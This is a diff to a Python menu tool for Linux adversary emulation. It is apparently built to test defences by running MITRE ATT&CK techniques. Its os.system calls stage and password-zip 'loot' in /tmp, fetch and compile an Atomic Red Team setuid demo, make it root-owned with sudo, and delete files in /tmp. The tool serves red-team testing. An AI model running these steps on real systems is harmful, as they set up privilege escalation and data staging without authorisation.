@@ -1,5 +1,6 @@
-#Tool to help sys admins
-#author - Name Here
+#Tool to help cybersecurity teams
+#author - @libertyunix
+#I am not programmer I am a hacker
 
 #Import our modules
 import sys
@@ -9,7 +10,7 @@ import time
 
 #Create a banner
 banner = """
-====================================================================================================================================================================
+=========================================================================================================================================================================
 
      ___   .___________.  ______   .___  ___.  __    ______           ___      __    __  .___________.  ______   .___  ___.      ___   .___________.  ______   .______      
     /   \  |           | /  __  \  |   \/   | |  |  /      |         /   \    |  |  |  | |           | /  __  \  |   \/   |     /   \  |           | /  __  \  |   _  \     
@@ -19,10 +20,10 @@ banner = """
 /__/     \__\  |__|      \______/  |__|  |__| |__|  \______|     /__/     \__\ \______/      |__|      \______/  |__|  |__| /__/     \__\  |__|      \______/  | _| `._____|
                                                                                                                                                                             
 
-================================================================================================================================================================================
+===========================================================================================================================================================================
 
 ================== A Tool for Adversarial Emulation on Linux ========================
-Please Select An ATT&CK Tactic & Technique
+                    Please Select An ATT&CK Tactic & Technique
 ======================================================================================
 [1] Exection
 [2] Persistance
@@ -187,7 +188,7 @@ while loop:
         os.system("gzip -f /tmp/loot.txt")
         time.sleep(1)
         print("Executing T1022 - Data Encrypted")
-        os.system("zip --password demopass /tmp/victim-files.zip /tmp/loot.txt)
+        os.system("zip --password demopass /tmp/victim-files.zip /tmp/loot.txt")
         time.sleep(1)
         print("Executing T1030 - Data Transfer Size Limits")
         os.system("cd /tmp/")
@@ -195,12 +196,12 @@ while loop:
         os.system("split -b 5000000 /tmp/victim-whole-file")
         time.sleep(2)
 #c&c
-    elif x == 8
+    elif x == 8:
         print ("Executing T1132 - Data Encoding")
         os.system("echo -n 555-555-5555 | base64 >> loot.txt")
         time.sleep(1)
 #atomicbomb
-    elif x == 9
+    elif x == 9:
         os.system("echo So long, and thanks for all the fish! >> /tmp/art-fish.txt")
         time.sleep(1)
         print "Execting T1059 - Command Line Interface"
@@ -240,10 +241,10 @@ while loop:
         print "Executing T1166 - Setuid and Setgid"
         os.system("wget -P /tmp/ https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1166/hello.c")
         #Modify downloaded hello demo to only sleep for 5 Seconds
-            with open('/tmp/hello.c', 'r') as file :
+        with open('/tmp/hello.c', 'r') as file :
             filedata = file.read()
             filedata = filedata.replace ('60', '5')
-            with open ('/tmp/hello.c', 'w') as file:
+        with open ('/tmp/hello.c', 'w') as file:
             file.write(filedata)
         os.system("gcc /tmp/hello.c -o /tmp/hello")
         os.system("sudo chown root /tmp/hello")
@@ -331,7 +332,7 @@ while loop:
         os.system("gzip -f /tmp/loot.txt")
         time.sleep(1)
         print("Executing T1022 - Data Encrypted")
-        os.system("zip --password demopass /tmp/victim-files.zip /tmp/loot.txt)
+        os.system("zip --password demopass /tmp/victim-files.zip /tmp/loot.txt")
         time.sleep(1)
         print("Executing T1030 - Data Transfer Size Limits")
         os.system("cd /tmp/")
@@ -341,3 +342,12 @@ while loop:
         print ("Executing T1132 - Data Encoding")
         os.system("echo -n 555-555-5555 | base64 >> loot.txt")
         time.sleep(1)
+
+    elif x == 10:
+        print("Cleaning this bad mother up")
+        os.system("rm /tmp/loot*")
+        os.system ("rm /tmp/*.sh")
+        time.sleep(1)
+        
+    elif x == 99:
+        quit()
